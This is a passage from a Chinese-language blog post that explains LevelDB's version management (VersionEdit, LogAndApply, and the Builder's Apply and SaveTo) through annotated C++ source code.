class="title">RemoveFile</span><span class="params">(<span class="keyword">int</span> level, <span class="keyword">uint64_t</span> file)</span> </span>&#123;</span><br><span class="line">  deleted_files_.insert(<span class="built_in">std</span>::make_pair(level, file));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RemoveFile函数调用，有两个函数caller:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20201006194127291.png" alt="image-20201006194127291"></p><p>AddInputDeletions， 在常规compaction中，加入所有选中了的compaction文件。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Compaction::AddInputDeletions</span><span class="params">(VersionEdit* edit)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> which = <span class="number">0</span>; which &lt; <span class="number">2</span>; which++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; inputs_[which].<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="comment">// !!!</span></span><br><span class="line">      edit-&gt;RemoveFile(level_ + which, inputs_[which][i]-&gt;number);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BackgroundCompaction，只看上层与下层不重叠的情况。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Status status;</span><br><span class="line"> <span class="keyword">if</span> (c == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">   <span class="comment">// Nothing to do</span></span><br><span class="line"> &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!is_manual &amp;&amp; c-&gt;IsTrivialMove()) &#123;</span><br><span class="line">   <span class="comment">// Move file to next level</span></span><br><span class="line">   assert(c-&gt;num_input_files(<span class="number">0</span>) == <span class="number">1</span>);</span><br><span class="line">   FileMetaData* f = c-&gt;input(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">     <span class="comment">// !!!!</span></span><br><span class="line">   c-&gt;edit()-&gt;RemoveFile(c-&gt;level(), f-&gt;number);</span><br><span class="line">   c-&gt;edit()-&gt;AddFile(c-&gt;level() + <span class="number">1</span>, f-&gt;number, f-&gt;file_size, f-&gt;smallest,</span><br><span class="line">                      f-&gt;largest);</span><br><span class="line">   status = versions_-&gt;LogAndApply(c-&gt;edit(), &amp;mutex_);</span><br><span class="line">   <span class="keyword">if</span> (!status.ok()) &#123;</span><br><span class="line">     RecordBackgroundError(status);</span><br><span class="line">   &#125;</span><br><span class="line">   VersionSet::LevelSummaryStorage tmp;</span><br><span class="line">   Log(options_.info_log, <span class="string">"Moved #%lld to level-%d %lld bytes %s: %s\n"</span>,</span><br><span class="line">       <span class="keyword">static_cast</span>&lt;<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>&gt;(f-&gt;number), c-&gt;level() + <span class="number">1</span>,</span><br><span class="line">       <span class="keyword">static_cast</span>&lt;<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>&gt;(f-&gt;file_size),</span><br><span class="line">       status.ToString().c_str(), versions_-&gt;LevelSummary(&amp;tmp));</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>再看==<strong>new_files_</strong>==</p><p>new_files_在==<strong>AddFile</strong>==中增加：‘</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Add the specified file at the specified number.</span></span><br><span class="line"><span class="comment">// REQUIRES: This version has not been saved (see VersionSet::SaveTo)</span></span><br><span class="line"><span class="comment">// REQUIRES: "smallest" and "largest" are smallest and largest keys in file</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddFile</span><span class="params">(<span class="keyword">int</span> level, <span class="keyword">uint64_t</span> file, <span class="keyword">uint64_t</span> file_size,</span></span></span><br><span class="line"><span class="function"><span class="params">             <span class="keyword">const</span> InternalKey&amp; smallest, <span class="keyword">const</span> InternalKey&amp; largest)</span> </span>&#123;</span><br><span class="line">  FileMetaData f;</span><br><span class="line">  f.number = file;</span><br><span class="line">  f.file_size = file_size;</span><br><span class="line">  f.smallest = smallest;</span><br><span class="line">  f.largest = largest;</span><br><span class="line">  new_files_.push_back(<span class="built_in">std</span>::make_pair(level, f));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AddFile被下图中的3各函数call：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20201006194516231.png" alt="image-20201006194516231"></p><p>WriteLevel0Table中是memtable dump 到level0所生成的新文件。</p><p>BackgroundCompaction是上层与下层不重叠的情况，紧接着是InstallCompactionResults：</p><p>InstallCompactionResults：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">DBImpl::InstallCompactionResults</span><span class="params">(CompactionState* compact)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Add compaction outputs</span></span><br><span class="line">  compact-&gt;compaction-&gt;AddInputDeletions(compact-&gt;compaction-&gt;edit());</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">int</span> level = compact-&gt;compaction-&gt;level();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; compact-&gt;outputs.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> CompactionState::Output&amp; out = compact-&gt;outputs[i];</span><br><span class="line">     <span class="comment">// 在level+1中生成新文件的结果</span></span><br><span class="line">    compact-&gt;compaction-&gt;edit()-&gt;AddFile(level + <span class="number">1</span>, out.number, out.file_size,</span><br><span class="line">                                         out.smallest, out.largest);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> versions_-&gt;LogAndApply(compact-&gt;compaction-&gt;edit(), &amp;mutex_);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-LogAndApply"><a href="#2-LogAndApply" class="headerlink" title="2. LogAndApply"></a>2. LogAndApply</h2><p>有了VersionEdit，自然就要分析下如何应用这个Edit了。</p><p>看一下LogAndApply的工作：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">VersionSet::LogAndApply</span><span class="params">(VersionEdit* edit, port::Mutex* mu)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 为edit绑定log_number</span></span><br><span class="line">  <span class="keyword">if</span> (edit-&gt;has_log_number_) &#123;</span><br><span class="line">    assert(edit-&gt;log_number_ &gt;= log_number_);</span><br><span class="line">    assert(edit-&gt;log_number_ &lt; next_file_number_);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    edit-&gt;SetLogNumber(log_number_);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!edit-&gt;has_prev_log_number_) &#123;</span><br><span class="line">    edit-&gt;SetPrevLogNumber(prev_log_number_);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  edit-&gt;SetNextFile(next_file_number_);</span><br><span class="line">  edit-&gt;SetLastSequence(last_sequence_);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// !!!应用edit到当前版本</span></span><br><span class="line">  Version* v = <span class="keyword">new</span> Version(<span class="keyword">this</span>);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function">Builder <span class="title">builder</span><span class="params">(<span class="keyword">this</span>, current_)</span></span>;</span><br><span class="line">    builder.Apply(edit);</span><br><span class="line">    builder.SaveTo(v);</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">   <span class="comment">// 通过本次version，计算下一次compaction相关变量，（compaction level和compaction score)</span></span><br><span class="line">  Finalize(v);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 下面和Manifest文件相关</span></span><br><span class="line">  <span class="comment">// Initialize new descriptor log file if necessary by creating</span></span><br><span class="line">  <span class="comment">// a temporary file that contains a snapshot of the current version.</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> new_manifest_file;</span><br><span class="line">  Status s;</span><br><span class="line">  <span class="keyword">if</span> (descriptor_log_ == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    <span class="comment">// No reason to unlock *mu here since we only hit this path in the</span></span><br><span class="line">    <span class="comment">// first call to LogAndApply (when opening the database).</span></span><br><span class="line">    assert(descriptor_file_ == <span class="literal">nullptr</span>);</span><br><span class="line">     <span class="comment">// new_manifest_file为当前manifest文件路径</span></span><br><span class="line">    new_manifest_file = DescriptorFileName(dbname_, manifest_file_number_);</span><br><span class="line">    edit-&gt;SetNextFile(next_file_number_);</span><br><span class="line">     <span class="comment">// 创建文件</span></span><br><span class="line">    s = env_-&gt;NewWritableFile(new_manifest_file, &amp;descriptor_file_);</span><br><span class="line">    <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">        <span class="comment">// 创建manifest写者</span></span><br><span class="line">      descriptor_log_ = <span class="keyword">new</span> <span class="built_in">log</span>::Writer(descriptor_file_);</span><br><span class="line">      s = WriteSnapshot(descriptor_log_);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Unlock during expensive MANIFEST log write</span></span><br><span class="line">  &#123;</span><br><span class="line">    mu-&gt;Unlock();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write new record to MANIFEST log</span></span><br><span class="line">    <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span> record;</span><br><span class="line">        <span class="comment">// edit内容编码到record !!, 可以看一下是怎么编码的，这样就知道manifest文件中保存的内容布局了</span></span><br><span class="line">      edit-&gt;EncodeTo(&amp;record);</span><br><span class="line">       <span class="comment">// 写入manifest文件</span></span><br><span class="line">      s = descriptor_log_-&gt;AddRecord(record);</span><br><span class="line">      <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">          <span class="comment">// 刷新到设备上</span></span><br><span class="line">        s = descriptor_file_-&gt;Sync();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (!s.ok()) &#123;</span><br><span class="line">        Log(options_-&gt;info_log, <span class="string">"MANIFEST write: %s\n"</span>, s.ToString().c_str());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 更新Current指针</span></span><br><span class="line">    <span class="comment">// If we just created a new descriptor file, install it by writing a</span></span><br><span class="line">    <span class="comment">// new CURRENT file that points to it.</span></span><br><span class="line">    <span class="keyword">if</span> (s.ok() &amp;&amp; !new_manifest_file.empty()) &#123;</span><br><span class="line">      s = SetCurrentFile(env_, dbname_, manifest_file_number_);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mu-&gt;Lock();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 插入当前version到VersionSet中</span></span><br><span class="line">  <span class="comment">// Install the new version</span></span><br><span class="line">  <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">     <span class="comment">// 插入version，更新current</span></span><br><span class="line">    AppendVersion(v);</span><br><span class="line">    log_number_ = edit-&gt;log_number_;</span><br><span class="line">    prev_log_number_ = edit-&gt;prev_log_number_;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">delete</span> v;</span><br><span class="line">    <span class="keyword">if</span> (!new_manifest_file.empty()) &#123;</span><br><span class="line">      <span class="keyword">delete</span> descriptor_log_;</span><br><span class="line">      <span class="keyword">delete</span> descriptor_file_;</span><br><span class="line">      descriptor_log_ = <span class="literal">nullptr</span>;</span><br><span class="line">      descriptor_file_ = <span class="literal">nullptr</span>;</span><br><span class="line">      env_-&gt;RemoveFile(new_manifest_file);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>工作：</p><ol><li>执行 old version + version_edit = new version</li><li>编码versionedit，并将其写入到manifest中，同时修改 CURRENT 指针</li><li>将新生成的version插入到versionset中</li></ol><p>current_版本的更替时机一定要注意到，LogAndApply生成新版本之后，同时将VersionEdit记录到MANIFEST文件之后，不然系统一旦crash，虽然数据不会丢失，但是系统后续启动时的性能会降低。（这段话不理解也没关系，等待后面对会专门出文章分析系统是如何启动的）。</p><h3 id="1-Builder"><a href="#1-Builder" class="headerlink" title="1.Builder"></a>1.Builder</h3><p>接下来需要重点分析下面三行代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// !!!应用edit到当前版本</span></span><br><span class="line">Version* v = <span class="keyword">new</span> Version(<span class="keyword">this</span>);</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function">Builder <span class="title">builder</span><span class="params">(<span class="keyword">this</span>, current_)</span></span>;</span><br><span class="line">  builder.Apply(edit);</span><br><span class="line">  builder.SaveTo(v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以builder自然是重点分析对象：</p><p>builder的内部数据域：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="built_in">std</span>::<span class="built_in">set</span>&lt;FileMetaData*, BySmallestKey&gt; FileSet;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LevelState</span> &#123;</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">set</span>&lt;<span class="keyword">uint64_t</span>&gt; deleted_files;</span><br><span class="line">  FileSet* added_files;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">VersionSet* vset_;</span><br><span class="line">Version* base_;</span><br><span class="line">LevelState levels_[<span class="built_in">config</span>::kNumLevels];<span class="comment">// 本次操作造成每层的数据变化</span></span><br></pre></td></tr></table></figure><h4 id="1-构造函数"><a href="#1-构造函数" class="headerlink" title="1.构造函数"></a>1.构造函数</h4><p>==Builder的构造函数：==</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line"> <span class="comment">// Initialize a builder with the files from *base and other info from *vset</span></span><br><span class="line"> Builder(VersionSet* vset, Version* base) : vset_(vset), base_(base) &#123;</span><br><span class="line">   base_-&gt;Ref();</span><br><span class="line">   BySmallestKey cmp;</span><br><span class="line">   cmp.internal_comparator = &amp;vset_-&gt;icmp_;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> level = <span class="number">0</span>; level &lt; <span class="built_in">config</span>::kNumLevels; level++) &#123;</span><br><span class="line">     levels_[level].added_files = <span class="keyword">new</span> FileSet(cmp);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这里只是完成了一些初始化工作。 这里使用了一个BySmallestKey比较器，简单看下实现：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Helper to sort by v-&gt;files_[file_number].smallest</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BySmallestKey</span> &#123;</span></span><br><span class="line">  <span class="keyword">const</span> InternalKeyComparator* internal_comparator;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(FileMetaData* f1, FileMetaData* f2)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> r = internal_comparator-&gt;Compare(f1-&gt;smallest, f2-&gt;smallest);<span class="comment">// 按照smallest key比较</span></span><br><span class="line">    <span class="keyword">if</span> (r != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> (r &lt; <span class="number">0</span>);<span class="comment">// 按照最小key升序</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// Break ties by file number</span></span><br><span class="line">      <span class="keyword">return</span> (f1-&gt;number &lt; f2-&gt;number);<span class="comment">// 按照文件序列升序，由于文件序列号越小，文件越旧，所以这里是按照文件从旧到新</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="2-Apply"><a href="#2-Apply" class="headerlink" title="2. Apply"></a>2. Apply</h4><p><strong>将edit中的更改保存在builder中。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Apply all of the edits in *edit to the current state.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Apply</span><span class="params">(VersionEdit* edit)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Update compaction pointers</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; edit-&gt;compact_pointers_.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> level = edit-&gt;compact_pointers_[i].first;<span class="comment">// first为 level</span></span><br><span class="line">    vset_-&gt;compact_pointer_[level] =</span><br><span class="line">        edit-&gt;compact_pointers_[i].second.Encode().ToString(); <span class="comment">// second 为 这一level开始compaction的key</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Delete files 删除文件保存在builder中</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; deleted_file_set_kvp : edit-&gt;deleted_files_) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> level = deleted_file_set_kvp.first;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> number = deleted_file_set_kvp.second;</span><br><span class="line">    levels_[level].deleted_files.insert(number);<span class="comment">// delete 的 file用number表示</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Add new files</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; edit-&gt;new_files_.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> level = edit-&gt;new_files_[i].first;</span><br><span class="line">    FileMetaData* f = <span class="keyword">new</span> FileMetaData(edit-&gt;new_files_[i].second);</span><br><span class="line">    f-&gt;refs = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 省略compaction相关代码</span></span><br><span class="line">     ...</span><br><span class="line"></span><br><span class="line">     </span><br><span class="line">    levels_[level].deleted_files.erase(f-&gt;number);<span class="comment">// 这里非常奇怪，将再SaveTo函数里面谈一点个人的理解</span></span><br><span class="line">    levels_[level].added_files-&gt;insert(f);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码注释说明了逻辑：</p><ol><li>更新compaction指针</li><li>保存操作中删除了的文件</li><li>保存操作中新增的文件</li></ol><p><strong>注意，added_files添加完元素后，内部是按照smallest key排序（如果smallest key相同则按照文件旧-&gt;新排序）的，这一点很重要，不然不好理解下面的SaveTo函数</strong></p><h4 id="3-SaveTo"><a href="#3-SaveTo" class="headerlink" title="3. SaveTo"></a>3. SaveTo</h4><p>builder中经过Apply已经保存了这次操作的增量，通过SaveTo将这个增量融合到Version中去。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Save the current state in *v.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">SaveTo</span><span class="params">(Version* v)</span> </span>&#123;</span><br><span class="line">    BySmallestKey cmp;<span class="comment">// 按照smallestkey比较，如果key相同，按照file number比较。</span></span><br><span class="line">    cmp.internal_comparator = &amp;vset_-&gt;icmp_;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> level = <span class="number">0</span>; level &lt; <span class="built_in">config</span>::kNumLevels; level++) &#123;<span class="comment">// 一层层的合并</span></span><br><span class="line">      <span class="comment">// Merge the set of added files with the set of pre-existing files.</span></span><br><span class="line">      <span class="comment">// Drop any deleted files.  Store the result in *v.</span></span><br><span class="line">      <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt;&amp; base_files = base_-&gt;files_[level];</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt;::const_iterator base_iter = base_files.<span class="built_in">begin</span>();</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt;::const_iterator base_end = base_files.<span class="built_in">end</span>();</span><br><span class="line">      <span class="keyword">const</span> FileSet* added_files = levels_[level].added_files;</span><br><span class="line">      v-&gt;files_[level].reserve(base_files.<span class="built_in">size</span>() + added_files-&gt;<span class="built_in">size</span>());</span><br><span class="line">      <span class="comment">// 小于added_files的key 的 当前版本中的文件，全部加入新版本中</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; added_file : *added_files) &#123;</span><br><span class="line">        <span class="comment">// Add all smaller files listed in base_</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt;::const_iterator bpos =</span><br><span class="line">                 <span class="built_in">std</span>::upper_bound(base_iter, base_end, added_file, cmp);</span><br><span class="line">             base_iter != bpos; ++base_iter) &#123;</span><br><span class="line"></span><br><span class="line">          MaybeAddFile(v, level, *base_iter);</span><br><span class="line">        &#125;</span><br><span class="line"> <span class="comment">// 加入 added_file</span></span><br><span class="line">        MaybeAddFile(v, level, added_file);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 剩余文件整合</span></span><br><span class="line">      <span class="comment">// Add remaining base files</span></span><br><span class="line">      <span class="keyword">for</span> (; base_iter != base_end; ++base_iter) &#123;</span><br><span class="line">        MaybeAddFile(v, level, *base_iter);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 下面是检查level&gt;0是否有overlap</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> NDEBUG</span></span><br><span class="line">      <span class="comment">// Make sure there is no overlap in levels &gt; 0</span></span><br><span class="line">      <span class="keyword">if</span> (level &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">1</span>; i &lt; v-&gt;files_[level].<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">          <span class="keyword">const</span> InternalKey&amp; prev_end = v-&gt;files_[level][i - <span class="number">1</span>]-&gt;largest;</span><br><span class="line">          <span class="keyword">const</span> InternalKey&amp; this_begin = v-&gt;files_[level][i]-&gt;smallest;</span><br><span class="line">          <span class="keyword">if</span> (vset_-&gt;icmp_.Compare(prev_end, this_begin) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"overlapping ranges in same level %s vs. %s\n"</span>,</span><br><span class="line">                         prev_end.DebugString().c_str(),</span><br><span class="line">                         this_begin.DebugString().c_str());</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">abort</span>();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  